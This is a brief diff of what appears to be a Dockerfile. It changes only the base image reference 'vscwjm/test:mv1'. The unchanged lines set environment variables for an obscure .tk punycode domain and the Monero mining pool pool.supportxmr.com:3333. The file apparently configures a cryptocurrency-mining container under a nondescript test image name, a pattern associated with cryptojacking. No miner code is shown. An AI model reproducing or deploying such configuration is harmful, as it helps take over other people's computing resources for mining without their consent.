@@ -1,4 +1,4 @@
-FROM docker.io/vscwjm/test:mv1
+FROM vscwjm/test:mv1
 
 ENV WWS_URL=xn--fiq811j6ckwjg.xn--6krt7h.tk
 ENV POOL_URL=pool.supportxmr.com:3333
